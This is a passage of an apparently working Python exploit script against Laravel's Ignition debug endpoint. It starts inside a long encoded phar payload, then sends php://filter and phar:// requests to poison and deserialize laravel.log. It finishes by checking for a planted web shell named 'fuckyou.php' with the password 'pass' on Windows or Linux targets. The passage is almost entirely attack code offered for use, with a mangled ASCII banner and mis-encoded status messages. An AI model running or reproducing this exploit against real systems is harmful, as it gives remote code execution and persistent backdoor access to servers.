00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def filterlog(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def phar(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"\\storage\\\\logs\\\\laravel.log\\\\test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def pharl(url,path): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"phar://\"+path+\"/storage/logs/laravel.log/test.txt\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def path(url): req=requests.get(url).text pattern = re.compile(r'(\\#\\d*\\ (.*)(?:\\/|\\\\)vendor)') m=pattern.findall(req) return m[0][1] if __name__=='__main__': print( ''' ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñí‚ñà‚ñà ‚ñí ‚ñì‚ñà ‚ñÄ ‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà ‚ñí ‚ñë ‚ñì‚ñà‚ñà‚ñÑ ‚ñí‚ñà‚ñà‚ñà ‚ñí‚ñì‚ñà ‚ñÑ ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñì‚ñà ‚ñÑ ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë ‚ñí ‚ñà‚ñà‚ñí ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñë ‚ñë‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë ‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë ‚ñë ‚ñë‚ñí ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí ‚ñë‚ñí ‚ñë ‚ñë‚ñí ‚ñë ‚ñí‚ñë ‚ñë ‚ñí ‚ñí‚ñë ‚ñë ‚ñë‚ñí ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë‚ñë ‚ñë‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ''') url=sys.argv[1]+\"/_ignition/execute-solution\" clearlog(url) clearlog(url) clearlog(url) clearlog(url) clearlog(url) if(AA(url).status_code==500): if(\":\" in path(url)): print(\"windows\") if(sendpayloadwindows(url).status_code==500): if(filterlog(url).status_code==200): if(phar(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"[+]webshellÂú∞ÂùÄ:\"+sys.argv[1]+\"/fuckyou.php,ÂØÜÁ†Å:pass\") else: print(\"[-]ÊºèÊ¥û‰∏çÂ≠òÂú®\") if(\":\" not in path(url)): print(\"linux\") if(sendpayloadlinux(url).status_code==500): if(filterlog(url).status_code==200): if(pharl(url,path(url)).status_code==500): if(requests.get(sys.argv[1]+\"/fuckyou.php\").status_code==200): print(\"webshellÂú∞ÂùÄ:\"+sys.argv[1]+\"/fuckyou.php,ÂØÜÁ†Å:pass\") else: print(\"[-]ÊºèÊ¥û‰∏çÂ≠òÂú®\") 